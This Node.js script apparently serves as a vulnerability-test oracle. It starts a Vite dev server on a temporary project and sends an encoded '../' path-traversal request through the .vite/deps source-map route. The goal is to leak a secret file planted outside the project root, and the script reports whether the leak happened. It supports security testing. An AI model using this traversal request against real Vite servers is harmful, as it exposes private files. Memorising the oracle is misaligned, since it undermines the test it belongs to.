const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite-map-pt-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'root');

  let server;
  try {
    fs.mkdirSync(path.join(root, 'node_modules', '.vite', 'deps'), { recursive: true });

    const benignMapPath = path.join(root, 'node_modules', '.vite', 'deps', 'safe.js.map');
    const benignMap = '{"version":3,"file":"safe.js","sources":["safe.ts"],"names":[],"mappings":""}';
    fs.writeFileSync(benignMapPath, benignMap);

    const secretPath = path.join(base, 'outside-secret.txt');
    const secret = 'SECRET_' + marker;
    fs.writeFileSync(secretPath, secret);

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') throw new Error('vite.createServer unavailable');

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      server: { middlewareMode: true }
    });

    async function requestOnce(url) {
      return new Promise((resolve, reject) => {
        const req = { method: 'GET', url, headers: { accept: '*/*' } };
        const chunks = [];
        const res = {
          statusCode: 200,
          _headers: {},
          setHeader(k, v) { this._headers[String(k).toLowerCase()] = v; },
          getHeader(k) { return this._headers[String(k).toLowerCase()]; },
          writeHead(code, headers) {
            this.statusCode = code;
            if (headers && typeof headers === 'object') {
              for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
            }
          },
          write(data) {
            if (data != null) chunks.push(Buffer.from(String(data)));
            return true;
          },
          end(data) {
            if (data != null) chunks.push(Buffer.from(String(data)));
            resolve({ statusCode: this.statusCode || 200, body: Buffer.concat(chunks).toString('utf8') });
          }
        };

        let finished = false;
        const done = (result) => {
          if (finished) return;
          finished = true;
          resolve(result);
        };

        try {
          server.middlewares(req, res, (err) => {
            if (err) return reject(err);
            done({ statusCode: res.statusCode || 404, body: Buffer.concat(chunks).toString('utf8'), next: true });
          });
        } catch (e) {
          reject(e);
        }
      });
    }

    const benign = await requestOnce('/node_modules/.vite/deps/safe.js.map');
    if (benign.statusCode >= 400 || benign.body.indexOf('"version":3') === -1) {
      throw new Error('benign failed status=' + benign.statusCode);
    }

    operation_completed = true;

    const traversal = encodeURIComponent('..') + '/' + encodeURIComponent('..') + '/' + encodeURIComponent('..') + '/outside-secret.txt';
    const maliciousUrl = '/node_modules/.vite/deps/' + traversal + '.map';

    try {
      const mal = await requestOnce(maliciousUrl);
      const leaked = mal.body.includes(secret);
      exploit_succeeded = leaked;
      evidence = 'benign=' + benign.statusCode + ';mal=' + mal.statusCode + ';next=' + (!!mal.next) + ';leaked=' + leaked + ';len=' + mal.body.length;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'benign=' + benign.statusCode + ';malicious_exception=' + (e && e.message ? e.message : String(e));
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (e && e.message ? e.message : String(e));
  } finally {
    if (server && typeof server.close === 'function') {
      try { await server.close(); } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();